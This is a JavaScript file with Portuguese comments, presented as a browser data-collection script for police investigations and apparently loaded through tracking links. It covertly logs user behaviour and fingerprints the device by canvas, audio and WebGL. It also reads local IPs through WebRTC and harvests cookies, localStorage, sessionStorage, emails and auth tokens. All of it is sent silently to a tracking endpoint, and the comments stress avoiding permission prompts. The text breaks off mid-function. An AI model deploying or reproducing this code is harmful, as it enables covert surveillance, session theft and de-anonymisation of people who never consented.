// Script avançado de coleta de dados do navegador
// Coleta o máximo de informações possíveis sobre o usuário e dispositivo
// Versão expandida para investigações policiais

// Variáveis globais para rastreamento de comportamento
let behaviorData = {
  mouseMovements: [],
  clicks: [],
  scrolls: [],
  keystrokes: [],
  focusEvents: [],
  visibilityChanges: [],
  resizeEvents: [],
  touchEvents: []
};

let startTime = Date.now();
let sessionId = generateSessionId();

// Iniciar rastreamento de comportamento
function startBehaviorTracking() {
  // Rastrear movimentos do mouse
  document.addEventListener('mousemove', (e) => {
    behaviorData.mouseMovements.push({
      x: e.clientX,
      y: e.clientY,
      timestamp: Date.now() - startTime
    });
    // NÃO LIMITAR - coletar TODOS os movimentos para análise completa
    // Removido limite para coleta máxima
  });

  // Rastrear cliques
  document.addEventListener('click', (e) => {
    behaviorData.clicks.push({
      x: e.clientX,
      y: e.clientY,
      target: e.target.tagName,
      targetId: e.target.id || '',
      targetClass: e.target.className || '',
      timestamp: Date.now() - startTime
    });
  });

  // Rastrear scroll
  let lastScrollTop = window.pageYOffset;
  window.addEventListener('scroll', () => {
    const scrollTop = window.pageYOffset;
    behaviorData.scrolls.push({
      scrollTop: scrollTop,
      scrollDelta: scrollTop - lastScrollTop,
      timestamp: Date.now() - startTime
    });
    lastScrollTop = scrollTop;
  });

  // Rastrear teclas pressionadas (timing apenas, não conteúdo)
  document.addEventListener('keydown', (e) => {
    behaviorData.keystrokes.push({
      key: e.key.length > 1 ? e.key : '[CHAR]', // Não registrar caracteres
      code: e.code,
      timestamp: Date.now() - startTime
    });
  });

  // Rastrear eventos de foco
  window.addEventListener('focus', () => {
    behaviorData.focusEvents.push({
      type: 'focus',
      timestamp: Date.now() - startTime
    });
  });

  window.addEventListener('blur', () => {
    behaviorData.focusEvents.push({
      type: 'blur',
      timestamp: Date.now() - startTime
    });
  });

  // Rastrear mudanças de visibilidade
  document.addEventListener('visibilitychange', () => {
    behaviorData.visibilityChanges.push({
      hidden: document.hidden,
      timestamp: Date.now() - startTime
    });
  });

  // Rastrear redimensionamento
  window.addEventListener('resize', () => {
    behaviorData.resizeEvents.push({
      width: window.innerWidth,
      height: window.innerHeight,
      timestamp: Date.now() - startTime
    });
  });

  // Rastrear eventos touch
  document.addEventListener('touchstart', (e) => {
    behaviorData.touchEvents.push({
      type: 'touchstart',
      touches: e.touches.length,
      timestamp: Date.now() - startTime
    });
  });
}

function generateSessionId() {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}

async function collectAllData(linkId) {
  const data = {
    // ID de sessão único
    sessionId: sessionId,
    
    // Dados de Rede (serão preenchidos pelo servidor)
    network: {},
    
    // Dados do Navegador (User-Agent)
    browser: {
      userAgent: navigator.userAgent,
      vendor: navigator.vendor,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages || [],
      cookieEnabled: navigator.cookieEnabled,
      onLine: navigator.onLine,
      doNotTrack: navigator.doNotTrack || 'unknown',
      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
      maxTouchPoints: navigator.maxTouchPoints || 0,
      deviceMemory: navigator.deviceMemory || 'unknown',
      connection: {},
      // Detecção de extensões
      extensions: await detectExtensions(),
      // Detecção de modo privado/incógnito
      privateMode: await detectPrivateMode(),
      // Detecção de automação/bot
      automation: detectAutomation()
    },
    
    // Dados do Dispositivo
    device: {
      screen: {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation ? {
          angle: screen.orientation.angle,
          type: screen.orientation.type
        } : 'unknown'
      },
      viewport: {
        width: window.innerWidth,
        height: window.innerHeight
      },
      touchSupport: {
        touchPoints: navigator.maxTouchPoints || 0,
        hasTouch: 'ontouchstart' in window || navigator.maxTouchPoints > 0
      }
    },
    
    // Dados Técnicos do Navegador
    technical: {
      javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
      plugins: getPlugins(),
      mimeTypes: getMimeTypes(),
      webgl: getWebGLInfo(),
      canvas: getCanvasFingerprint(),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      localTime: new Date().toLocaleString(),
      timestamp: new Date().toISOString()
    },
    
    // Dados de Acesso
    access: {
      url: window.location.href,
      referrer: document.referrer || 'direct',
      protocol: window.location.protocol,
      host: window.location.host,
      hostname: window.location.hostname,
      pathname: window.location.pathname,
      search: window.location.search,
      hash: window.location.hash
    },
    
    // Dados de Comportamento (EXPANDIDO - MÁXIMO)
    behavior: {
      pageLoadTime: performance.timing ? {
        navigationStart: performance.timing.navigationStart,
        domContentLoaded: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
        loadComplete: performance.timing.loadEventEnd - performance.timing.navigationStart,
        dnsLookup: performance.timing.domainLookupEnd - performance.timing.domainLookupStart,
        tcpConnect: performance.timing.connectEnd - performance.timing.connectStart,
        serverResponse: performance.timing.responseEnd - performance.timing.requestStart,
        domProcessing: performance.timing.domComplete - performance.timing.domLoading,
        pageRender: performance.timing.loadEventEnd - performance.timing.domComplete,
        // Timing detalhado
        redirect: performance.timing.redirectEnd - performance.timing.redirectStart,
        unload: performance.timing.unloadEventEnd - performance.timing.unloadEventStart,
        request: performance.timing.responseStart - performance.timing.requestStart,
        response: performance.timing.responseEnd - performance.timing.responseStart,
        domLoading: performance.timing.domLoading - performance.timing.navigationStart,
        domInteractive: performance.timing.domInteractive - performance.timing.navigationStart,
        domContentLoaded: performance.timing.domContentLoadedEventStart - performance.timing.navigationStart,
        domComplete: performance.timing.domComplete - performance.timing.navigationStart,
        loadEvent: performance.timing.loadEventEnd - performance.timing.loadEventStart
      } : 'unknown',
      performance: getPerformanceData(),
      storage: await getStorageInfo(),
      // Dados de comportamento em tempo real (MÁXIMO)
      mouseMovements: behaviorData.mouseMovements, // TODOS os movimentos (não limitado)
      clicks: behaviorData.clicks, // TODOS os cliques
      scrolls: behaviorData.scrolls, // TODOS os scrolls
      keystrokes: behaviorData.keystrokes, // TODOS os keystrokes
      focusEvents: behaviorData.focusEvents,
      visibilityChanges: behaviorData.visibilityChanges,
      resizeEvents: behaviorData.resizeEvents,
      touchEvents: behaviorData.touchEvents,
      timeOnPage: Date.now() - startTime,
      // Análise de comportamento suspeito (EXPANDIDA)
      suspiciousBehavior: analyzeSuspiciousBehavior(),
      // Análise avançada de padrões
      behaviorPattern: analyzeBehaviorPattern(),
      // Estatísticas de comportamento
      behaviorStats: calculateBehaviorStats()
    },
    
    // Dados Adicionais (EXPANDIDO - SILENCIOSO)
    additional: {
      battery: await getBatteryInfoSilent(),
      mediaDevices: await getMediaDevicesSilent(),
      permissions: await getPermissionsSilent(),
      geolocation: await getGeolocationSilent(), // Removido - evita pedir permissão
      fonts: getFonts(),
      localStorage: getLocalStorage(),
      sessionStorage: getSessionStorage(),
      cookies: document.cookie || 'none',
      // WebRTC - IPs locais (silencioso)
      webRTC: await getWebRTCIPsSilent(),
      // Histórico de navegação (limitado)
      historyLength: window.history.length,
      // Dados de formulários (se houver)
      forms: getFormData(),
      // Screenshot da página (canvas)
      pageScreenshot: await getPageScreenshot(),
      // Dados de rede social (se compartilhado)
      socialMedia: getSocialMediaData(),
      // Dados de clipboard (removido - pede permissão)
      clipboard: { available: false, skipped: true },
      // Dados de vibração (mobile)
      vibration: detectVibration(),
      // Dados de orientação do dispositivo (sem pedir permissão)
      deviceOrientation: await getDeviceOrientationSilent(),
      // Dados de movimento do dispositivo (sem pedir permissão)
      deviceMotion: await getDeviceMotionSilent(),
      // Dados de iluminação ambiente (sem pedir permissão)
      ambientLight: await getAmbientLightSilent()
    },
    
    // NOVO: Dados de Contas e Emails Vinculados
    accounts: {
      // Emails encontrados em cookies/localStorage
      emails: extractEmails(),
      // Contas de serviços detectadas
      linkedAccounts: await detectLinkedAccounts(),
      // Tokens de autenticação (quando detectáveis)
      authTokens: extractAuthTokens(),
      // Dados de serviços de terceiros
      thirdPartyServices: await detectThirdPartyServices(),
      // Cross-site tracking
      crossSiteTracking: await detectCrossSiteTracking(),
      // Dados de autenticação
      authentication: await detectAuthentication(),
      // Histórico de login (limitado)
      loginHistory: getLoginHistory()
    },
    
    // Dados de Requisição HTTP
    http: {
      headers: getHTTPHeaders(),
      encoding: document.characterSet || document.charset,
      contentType: document.contentType || 'unknown'
    },
    
    // Fingerprinting Avançado (EXPANDIDO - MÁXIMO)
    fingerprint: {
      canvas: getCanvasFingerprint(),
      webgl: getWebGLInfo(),
      audio: await getAudioFingerprint(),
      fonts: getFonts(),
      // Fingerprint composto
      compositeFingerprint: generateCompositeFingerprint(),
      // Hash de todas as características
      hash: null, // Será calculado depois
      // Fingerprints adicionais
      screenFingerprint: getScreenFingerprint(),
      timezoneFingerprint: getTimezoneFingerprint(),
      languageFingerprint: getLanguageFingerprint(),
      pluginFingerprint: getPluginFingerprint(),
      // Hash único combinado
      uniqueDeviceId: null // Será calculado depois
    },
    
    // Dados de Segurança e Privacidade
    security: {
      // Detecção de VPN/Proxy (será feito no servidor também)
      vpnProxy: detectVPNProxy(),
      // Headers de segurança
      securityHeaders: getSecurityHeaders(),
      // Dados de CORS
      cors: getCORSInfo(),
      // Dados de Content Security Policy
      csp: getCSPInfo()
    },
    
    // Dados de Redes Sociais e Compartilhamento
    social: {
      // Dados quando compartilhado em redes sociais
      shareData: getSocialMediaData(),
      // Referrer de redes sociais
      socialReferrer: detectSocialReferrer(),
      // Dados de embed (se aplicável)
      embedData: getEmbedData()
    }
  };

  // Calcular hash do fingerprint
  data.fingerprint.hash = calculateFingerprintHash(data);
  data.fingerprint.uniqueDeviceId = generateUniqueDeviceId(data);

  // Tentar obter informações de conexão
  if (navigator.connection) {
    data.browser.connection = {
      effectiveType: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt,
      saveData: navigator.connection.saveData
    };
  }

  // Enviar dados para o servidor (SILENCIOSAMENTE - sem mostrar erros)
  try {
    const dataStr = JSON.stringify(data);
    
    // Usar sendBeacon para garantir envio mesmo se a página fechar (mais confiável)
    if (navigator.sendBeacon) {
      const formData = new FormData();
      formData.append('data', dataStr);
      navigator.sendBeacon(`/api/track/${linkId}`, formData);
    }
    
    // Também tentar fetch normal com keepalive (para garantir envio)
    const response = await fetch(`/api/track/${linkId}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: dataStr,
      keepalive: true // Manter conexão aberta mesmo após redirecionamento
    }).catch(() => {
      // Erro silencioso - sendBeacon já tentou
      return null;
    });

    if (response) {
      const result = await response.json().catch(() => null);
      return result;
    }
    
    return { sent: true }; // sendBeacon enviou
  } catch (error) {
    // Erro completamente silencioso - não mostrar nada ao usuário
    return null;
  }
}

// Funções auxiliares

function getPlugins() {
  const plugins = [];
  if (navigator.plugins) {
    for (let i = 0; i < navigator.plugins.length; i++) {
      plugins.push({
        name: navigator.plugins[i].name,
        description: navigator.plugins[i].description,
        filename: navigator.plugins[i].filename
      });
    }
  }
  return plugins;
}

function getMimeTypes() {
  const mimeTypes = [];
  if (navigator.mimeTypes) {
    for (let i = 0; i < navigator.mimeTypes.length; i++) {
      mimeTypes.push({
        type: navigator.mimeTypes[i].type,
        description: navigator.mimeTypes[i].description,
        suffixes: navigator.mimeTypes[i].suffixes
      });
    }
  }
  return mimeTypes;
}

function getWebGLInfo() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    
    if (!gl) return { available: false };

    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    
    return {
      available: true,
      vendor: gl.getParameter(gl.VENDOR),
      renderer: gl.getParameter(gl.RENDERER),
      version: gl.getParameter(gl.VERSION),
      shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
      debugRendererInfo: debugInfo ? {
        unmaskedVendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
        unmaskedRenderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
      } : null,
      parameters: {
        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
        maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
        maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
        aliasedLineWidthRange: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
        aliasedPointSizeRange: gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE)
      }
    };
  } catch (e) {
    return { available: false, error: e.message };
  }
}

function getCanvasFingerprint() {
  try {
    const canvas = document.createElement('canvas');
    canvas.width = 200;
    canvas.height = 50;
    const ctx = canvas.getContext('2d');
    
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.textBaseline = 'alphabetic';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('Canvas fingerprint 🔒', 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText('Canvas fingerprint 🔒', 4, 17);
    
    return canvas.toDataURL().substring(0, 100); // Primeiros 100 caracteres como fingerprint
  } catch (e) {
    return 'error';
  }
}

// Versão silenciosa
async function getBatteryInfoSilent() {
  try {
    if (navigator.getBattery) {
      const battery = await Promise.race([
        navigator.getBattery(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 200))
      ]);
      return {
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime,
        level: battery.level
      };
    }
  } catch (e) {
    // Falha silenciosa
  }
  return 'not_available';
}

// Versão silenciosa - não pede permissão
async function getMediaDevicesSilent() {
  try {
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
      const devices = await Promise.race([
        navigator.mediaDevices.enumerateDevices(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 300))
      ]);
      // enumerateDevices não requer permissão, mas labels podem estar vazios
      return devices.map(device => ({
        kind: device.kind,
        label: device.label || 'no_label', // Sem permissão, label fica vazio
        deviceId: device.deviceId ? device.deviceId.substring(0, 20) + '...' : 'none'
      }));
    }
  } catch (e) {
    // Falha silenciosa
  }
  return 'not_available';
}

// Versão silenciosa - apenas verifica status sem pedir permissão
// REMOVIDO: navigator.permissions.query pode pedir permissão em alguns navegadores
async function getPermissionsSilent() {
  // Não verificamos permissões para evitar qualquer popup
  // Retornamos apenas informações básicas sem fazer queries
  return {
    geolocation: 'not_checked',
    notifications: 'not_checked',
    push: 'not_checked',
    camera: 'not_checked',
    microphone: 'not_checked',
    persistentStorage: 'not_checked',
    note: 'Permissions check disabled to avoid popups'
  };
}

// Versão silenciosa - REMOVIDO completamente para evitar pedidos de permissão
// getCurrentPosition SEMPRE pede permissão na primeira vez
async function getGeolocationSilent() {
  // Não tentamos obter geolocalização para evitar popup de permissão
  // A geolocalização por IP será feita no servidor (sem pedir permissão)
  return {
    skipped: true,
    reason: 'Avoid permission popup',
    note: 'Geolocation by IP will be done on server instead'
  };
}

function getFonts() {
  const baseFonts = ['monospace', 'sans-serif', 'serif'];
  const testString = 'mmmmmmmmmmlli';
  const testSize = '72px';
  const h = document.getElementsByTagName('body')[0];
  const s = document.createElement('span');
  s.style.fontSize = testSize;
  s.innerHTML = testString;
  const defaultWidth = {};
  const defaultHeight = {};

  for (let i = 0; i < baseFonts.length; i++) {
    s.style.fontFamily = baseFonts[i];
    h.appendChild(s);
    defaultWidth[baseFonts[i]] = s.offsetWidth;
    defaultHeight[baseFonts[i]] = s.offsetHeight;
    h.removeChild(s);
  }

  const detectedFonts = [];
  const fonts = [
    'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
    'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS',
    'Impact', 'Lucida Console', 'Tahoma', 'Helvetica'
  ];

  for (let i = 0; i < fonts.length; i++) {
    let detected = false;
    for (let j = 0; j < baseFonts.length; j++) {
      s.style.fontFamily = fonts[i] + ',' + baseFonts[j];
      h.appendChild(s);
      const matched = (s.offsetWidth !== defaultWidth[baseFonts[j]] || 
                      s.offsetHeight !== defaultHeight[baseFonts[j]]);
      h.removeChild(s);
      if (matched) {
        detected = true;
        break;
      }
    }
    if (detected) detectedFonts.push(fonts[i]);
  }

  return detectedFonts;
}

function getLocalStorage() {
  try {
    const items = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      items[key] = localStorage.getItem(key);
    }
    return items;
  } catch (e) {
    return 'not_available';
  }
}

function getSessionStorage() {
  try {
    const items = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      items[key] = sessionStorage.getItem(key);
    }
    return items;
  } catch (e) {
    return 'not_available';
  }
}

function getPerformanceData() {
  try {
    if (window.performance && window.performance.memory) {
      return {
        memory: {
          usedJSHeapSize: window.performance.memory.usedJSHeapSize,
          totalJSHeapSize: window.performance.memory.totalJSHeapSize,
          jsHeapSizeLimit: window.performance.memory.jsHeapSizeLimit
        }
      };
    }
  } catch (e) {
    // Ignorar
  }
  return 'not_available';
}

function getStorageInfo() {
  try {
    if (navigator.storage && navigator.storage.estimate) {
      return navigator.storage.estimate().then(estimate => ({
        quota: estimate.quota,
        usage: estimate.usage,
        usageDetails: estimate.usageDetails
      }));
    }
  } catch (e) {
    // Ignorar
  }
  return Promise.resolve('not_available');
}

async function getAudioFingerprint() {
  try {
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const analyser = audioContext.createAnalyser();
    const gainNode = audioContext.createGain();
    const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);

    gainNode.gain.value = 0;
    oscillator.connect(analyser);
    analyser.connect(scriptProcessor);
    scriptProcessor.connect(gainNode);
    gainNode.connect(audioContext.destination);

    oscillator.type = 'triangle';
    oscillator.frequency.value = 10000;

    return new Promise((resolve) => {
      scriptProcessor.onaudioprocess = (bins) => {
        const output = String.fromCharCode.apply(null, new Uint8Array(bins.inputBuffer.getChannelData(0).buffer));
        audioContext.close();
        resolve(output.substring(0, 50)); // Primeiros 50 caracteres como fingerprint
      };
      oscillator.start(0);
      setTimeout(() => {
        oscillator.stop();
        audioContext.close();
        resolve('timeout');
      }, 100);
    });
  } catch (e) {
    return 'error';
  }
}

function getHTTPHeaders() {
  // Headers que podem ser detectados via JavaScript são limitados
  return {
    acceptLanguage: navigator.language,
    acceptLanguages: navigator.languages || [],
    userAgent: navigator.userAgent,
    platform: navigator.platform
  };
}

// NOVAS FUNÇÕES AVANÇADAS

// Detectar extensões do navegador
async function detectExtensions() {
  const extensions = {
    adblock: false,
    privacy: false,
    automation: false
  };

  // Detectar AdBlock
  try {
    const testDiv = document.createElement('div');
    testDiv.innerHTML = '&nbsp;';
    testDiv.className = 'adsbox';
    testDiv.style.position = 'absolute';
    testDiv.style.left = '-9999px';
    document.body.appendChild(testDiv);
    await new Promise(resolve => setTimeout(resolve, 100));
    extensions.adblock = testDiv.offsetHeight === 0;
    document.body.removeChild(testDiv);
  } catch (e) {}

  // Detectar extensões de privacidade
  if (window.navigator.webdriver) {
    extensions.automation = true;
  }

  // Detectar se localStorage está bloqueado (indicador de extensão de privacidade)
  try {
    localStorage.setItem('test', 'test');
    localStorage.removeItem('test');
  } catch (e) {
    extensions.privacy = true;
  }

  return extensions;
}

// Detectar modo privado/incógnito
async function detectPrivateMode() {
  return new Promise((resolve) => {
    let isPrivate = false;
    
    // Método 1: localStorage
    try {
      localStorage.setItem('test', 'test');
      localStorage.removeItem('test');
    } catch (e) {
      isPrivate = true;
    }
    
    // Método 2: IndexedDB
    if (!isPrivate) {
      try {
        const db = indexedDB.open('test');
        db.onerror = () => { isPrivate = true; resolve(isPrivate); };
        db.onsuccess = () => { resolve(isPrivate); };
        setTimeout(() => resolve(isPrivate), 100);
      } catch (e) {
        isPrivate = true;
        resolve(isPrivate);
      }
    } else {
      resolve(isPrivate);
    }
  });
}

// Detectar automação/bot
function detectAutomation() {
  const indicators = {
    webdriver: navigator.webdriver || false,
    chrome: window.chrome && window.chrome.runtime ? false : true,
    permissions: false,
    plugins: navigator.plugins.length === 0,
    languages: navigator.languages.length === 0
  };

  // Verificar se é bot por falta de características humanas
  if (navigator.plugins.length === 0 && navigator.languages.length === 0) {
    indicators.bot = true;
  }

  return indicators;
}

// Versão silenciosa - WebRTC não pede permissão
async function getWebRTCIPsSilent() {
  return new Promise((resolve) => {
    const ips = [];
    const RTCPeerConnection = window.RTCPeerConnection || 
                              window.mozRTCPeerConnection || 
                              window.webkitRTCPeerConnection;

    if (!RTCPeerConnection) {
      resolve('not_available');
      return;
    }

    const pc = new RTCPeerConnection({
      iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
    });

    pc.createDataChannel('');
    pc.onicecandidate = (event) => {
      if (event.candidate) {
        const candidate = event.candidate.candidate;
        const match = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(candidate);
        if (match) {
          const ip = match[1];
          if (ips.indexOf(ip) === -1) {
            ips.push(ip);
          }
        }
      } else {
        pc.close();
        resolve(ips.length > 0 ? ips : 'none');
      }
    };

    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {
      resolve('error');
    });

    // Timeout reduzido para não bloquear
    setTimeout(() => {
      pc.close();
      resolve(ips.length > 0 ? ips : 'timeout');
    }, 1500); // Reduzido de 3000 para 1500ms
  });
}

// Obter dados de formulários na página
function getFormData() {
  const forms = [];
  const formElements = document.querySelectorAll('form');
  
  formElements.forEach((form, index) => {
    const formData = {
      index: index,
      action: form.action || '',
      method: form.method || 'get',
      fields: []
    };

    const inputs = form.querySelectorAll('input, textarea, select');
    inputs.forEach(input => {
      formData.fields.push({
        type: input.type || input.tagName.toLowerCase(),
        name: input.name || '',
        id: input.id || '',
        hasValue: input.value.length > 0
      });
    });

    forms.push(formData);
  });

  return forms;
}

// Capturar screenshot da página
async function getPageScreenshot() {
  try {
    // Usar html2canvas se disponível, senão retornar canvas básico
    const canvas = document.createElement('canvas');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const ctx = canvas.getContext('2d');
    
    // Tentar capturar (limitado por CORS)
    // Retornar apenas metadados da página
    return {
      width: window.innerWidth,
      height: window.innerHeight,
      scrollWidth: document.documentElement.scrollWidth,
      scrollHeight: document.documentElement.scrollHeight,
      available: 'limited' // Screenshot completo requer biblioteca externa
    };
  } catch (e) {
    return 'error';
  }
}

// Obter dados de redes sociais
function getSocialMediaData() {
  const data = {
    referrer: document.referrer,
    isSocial: false,
    platform: null
  };

  const socialPlatforms = {
    'facebook.com': 'Facebook',
    'twitter.com': 'Twitter',
    'x.com': 'Twitter/X',
    'linkedin.com': 'LinkedIn',
    'whatsapp.com': 'WhatsApp',
    'telegram.org': 'Telegram',
    'instagram.com': 'Instagram',
    'reddit.com': 'Reddit'
  };

  if (document.referrer) {
    for (const domain in socialPlatforms) {
      if (document.referrer.includes(domain)) {
        data.isSocial = true;
        data.platform = socialPlatforms[domain];
        break;
      }
    }
  }

  return data;
}

// Detectar referrer de redes sociais
function detectSocialReferrer() {
  const referrer = document.referrer.toLowerCase();
  const socialDomains = ['facebook', 'twitter', 'x.com', 'linkedin', 'whatsapp', 'telegram', 'instagram', 'reddit'];
  
  for (const domain of socialDomains) {
    if (referrer.includes(domain)) {
      return {
        isSocial: true,
        platform: domain,
        url: document.referrer
      };
    }
  }

  return { isSocial: false };
}

// Obter dados de clipboard
// Função removida - clipboard pede permissão explícita
// Não usamos mais para evitar pedidos de permissão

// Detectar vibração
function detectVibration() {
  if (navigator.vibrate) {
    return { available: true };
  }
  return { available: false };
}

// Versão silenciosa - DeviceOrientation não pede permissão em muitos casos
async function getDeviceOrientationSilent() {
  return new Promise((resolve) => {
    if (window.DeviceOrientationEvent) {
      const handler = (event) => {
        resolve({
          available: true,
          alpha: event.alpha,
          beta: event.beta,
          gamma: event.gamma
        });
        window.removeEventListener('deviceorientation', handler);
      };
      window.addEventListener('deviceorientation', handler);
      setTimeout(() => resolve({ available: false }), 500); // Timeout reduzido
    } else {
      resolve({ available: false });
    }
  });
}

// Versão silenciosa
async function getDeviceMotionSilent() {
  return new Promise((resolve) => {
    if (window.DeviceMotionEvent) {
      const handler = (event) => {
        resolve({
          available: true,
          acceleration: event.acceleration,
          accelerationIncludingGravity: event.accelerationIncludingGravity,
          rotationRate: event.rotationRate
        });
        window.removeEventListener('devicemotion', handler);
      };
      window.addEventListener('devicemotion', handler);
      setTimeout(() => resolve({ available: false }), 500); // Timeout reduzido
    } else {
      resolve({ available: false });
    }
  });
}

// Versão silenciosa
async function getAmbientLightSilent() {
  return new Promise((resolve) => {
    if (window.AmbientLightSensor) {
      try {
        const sensor = new AmbientLightSensor();
        sensor.onreading = () => {
          resolve({
            available: true,
            illuminance: sensor.illuminance
          });
        };
        sensor.start();
        setTimeout(() => resolve({ available: false }), 500); // Timeout reduzido
      } catch (e) {
        resolve({ available: false });
      }
    } else {
      resolve({ available: false });
    }
  });
}

// Detectar VPN/Proxy (indicadores básicos)
function detectVPNProxy() {
  const indicators = {
    // Será melhorado no servidor com APIs externas
    timezoneMismatch: false,
    languageMismatch: false
  };

  // Verificar se timezone corresponde ao país (será feito no servidor)
  return indicators;
}

// Obter headers de segurança
function getSecurityHeaders() {
  return {
    // Headers não acessíveis via JS, mas podemos verificar comportamentos
    https: window.location.protocol === 'https:',
    mixedContent: detectMixedContent()
  };
}

function detectMixedContent() {
  // Verificar se há conteúdo misto na página
  const images = document.querySelectorAll('img');
  let mixedContent = false;
  
  images.forEach(img => {
    if (img.src && img.src.startsWith('http://') && window.location.protocol === 'https:') {
      mixedContent = true;
    }
  });

  return mixedContent;
}

// Obter dados de CORS
function getCORSInfo() {
  return {
    // Informações limitadas via JS
    sameOrigin: window.location.origin === window.location.origin
  };
}

// Obter dados de CSP
function getCSPInfo() {
  const metaTags = document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]');
  return {
    hasCSP: metaTags.length > 0,
    cspCount: metaTags.length
  };
}

// Obter dados de embed
function getEmbedData() {
  return {
    isIframe: window.self !== window.top,
    parentOrigin: window.self !== window.top ? document.referrer : null
  };
}

// Gerar fingerprint composto
function generateCompositeFingerprint() {
  const components = [
    navigator.userAgent,
    navigator.language,
    screen.width + 'x' + screen.height,
    new Date().getTimezoneOffset().toString(),
    navigator.platform
  ].join('|');

  return btoa(components).substring(0, 32);
}

// Calcular hash do fingerprint
function calculateFingerprintHash(data) {
  const str = JSON.stringify({
    userAgent: data.browser.userAgent,
    language: data.browser.language,
    screen: data.device.screen,
    timezone: data.technical.timezone,
    canvas: data.fingerprint.canvas.substring(0, 20)
  });

  // Hash simples (em produção, usar crypto.subtle)
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    const char = str.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash; // Convert to 32bit integer
  }
  return hash.toString(36);
}

// Gerar ID único do dispositivo (persistente mesmo após limpar cookies)
function generateUniqueDeviceId(data) {
  const components = [
    data.browser.userAgent,
    data.browser.hardwareConcurrency,
    data.device.screen.width + 'x' + data.device.screen.height,
    data.device.screen.colorDepth,
    data.technical.timezone,
    data.browser.language,
    data.fingerprint.canvas.substring(0, 30),
    data.fingerprint.webgl?.renderer || '',
    data.fingerprint.fonts?.join(',') || '',
    data.browser.platform
  ].join('|');
  
  // Hash mais robusto
  let hash = 0;
  for (let i = 0; i < components.length; i++) {
    const char = components.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash;
  }
  
  // Adicionar timestamp para tornar único por sessão também
  const sessionHash = Math.random().toString(36).substring(2, 15);
  return btoa(hash.toString(36) + '|' + sessionHash).substring(0, 32);
}

// Screen Fingerprint
function getScreenFingerprint() {
  return {
    resolution: `${screen.width}x${screen.height}`,
    availResolution: `${screen.availWidth}x${screen.availHeight}`,
    colorDepth: screen.colorDepth,
    pixelDepth: screen.pixelDepth,
    ratio: (screen.width / screen.height).toFixed(2),
    availRatio: (screen.availWidth / screen.availHeight).toFixed(2)
  };
}

// Timezone Fingerprint
function getTimezoneFingerprint() {
  const options = Intl.DateTimeFormat().resolvedOptions();
  return {
    timezone: options.timeZone,
    offset: new Date().getTimezoneOffset(),
    locale: options.locale,
    calendar: options.calendar,
    numberingSystem: options.numberingSystem,
    hour12: options.hour12
  };
}

// Language Fingerprint
function getLanguageFingerprint() {
  return {
    primary: navigator.language,
    all: navigator.languages || [],
    count: (navigator.languages || []).length,
    acceptLanguage: navigator.language + ',' + (navigator.languages || []).join(',')
  };
}

// Plugin Fingerprint
function getPluginFingerprint() {
  const plugins = [];
  if (navigator.plugins) {
    for (let i = 0; i < navigator.plugins.length; i++) {
      plugins.push(navigator.plugins[i].name);
    }
  }
  return {
    count: plugins.length,
    list: plugins,
    hash: btoa(plugins.join(',')).substring(0, 20)
  };
}

// Analisar comportamento suspeito (EXPANDIDO)
function analyzeSuspiciousBehavior() {
  const analysis = {
    suspicious: false,
    reasons: [],
    botProbability: 0,
    humanProbability: 100
  };

  const timeOnPage = Date.now() - startTime;

  // Verificar se há muito pouco movimento do mouse (bot)
  if (behaviorData.mouseMovements.length < 5 && timeOnPage > 3000) {
    analysis.suspicious = true;
    analysis.botProbability += 30;
    analysis.reasons.push('Pouco movimento do mouse');
  }

  // Verificar padrão de movimento do mouse (humanos têm padrões irregulares)
  if (behaviorData.mouseMovements.length > 10) {
    const movements = behaviorData.mouseMovements;
    let regularity = 0;
    for (let i = 1; i < Math.min(movements.length, 20); i++) {
      const dist = Math.sqrt(
